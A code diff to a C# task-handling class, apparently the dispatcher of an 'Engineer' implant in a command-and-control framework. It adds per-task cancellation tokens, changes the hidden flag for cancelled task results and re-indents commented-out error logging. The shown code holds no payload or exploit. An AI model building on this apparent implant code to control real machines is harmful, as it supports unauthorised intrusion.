@@ -7,6 +7,7 @@ using System.Text;
 using System.Threading.Tasks;
 using Engineer.Commands;
 using System.Collections.Concurrent;
+using System.Threading;
 
 namespace Engineer.Functions
 {
@@ -14,6 +15,7 @@ namespace Engineer.Functions
     {
         public static ConcurrentDictionary<string, EngineerTaskResult> engTaskResultDic = new(); // key is the task id and value is the whole task
         public static ConcurrentDictionary<string, EngineerTask> engTaskDic = new(); // key is the task id and value is the whole task
+        public static ConcurrentDictionary<string,CancellationTokenSource> cancellationTokenSourceDic = new();
 
         public static void DealWithTasks(IEnumerable<EngineerTask> tasks)
         {
@@ -21,6 +23,12 @@ namespace Engineer.Functions
             {
                 foreach (var task in tasks)
                 {
+                    // Create a new CancellationTokenSource for the task
+                    CancellationTokenSource cts = new CancellationTokenSource();
+                    // Update the task's cancelToken property with the CancellationToken from the CancellationTokenSource
+                    task.cancelToken = cts.Token;
+
+                    cancellationTokenSourceDic.TryAdd(task.Id, cts);
                     //if task.IsBlocking is true then we need to wait for the task to finish before we can continue
                     if (task.IsBlocking)
                     {
@@ -80,8 +88,8 @@ namespace Engineer.Functions
             }
             catch (Exception ex)
             {
-                //Console.WriteLine(ex.Message);
-                //Console.WriteLine(ex.StackTrace);
+               // Console.WriteLine(ex.Message);
+               // Console.WriteLine(ex.StackTrace);
             }  
         }
 
@@ -160,7 +168,7 @@ namespace Engineer.Functions
                 }
                 else if(task.Command.Equals("canceltask",StringComparison.CurrentCultureIgnoreCase))
                 {
-                    engTaskResultDic[task.Id].IsHidden = true;
+                    engTaskResultDic[task.Id].IsHidden = false;
                     SendTaskResult(engTaskResultDic[task.Id]);
                 }
                 else if (task.Command.Equals("UpdateTaskKey", StringComparison.CurrentCultureIgnoreCase))
@@ -230,8 +238,8 @@ namespace Engineer.Functions
             }
             catch (Exception e)
             {
-               // Console.WriteLine(e.Message);
-                //Console.WriteLine(e.StackTrace);
+                //Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
         }
     }
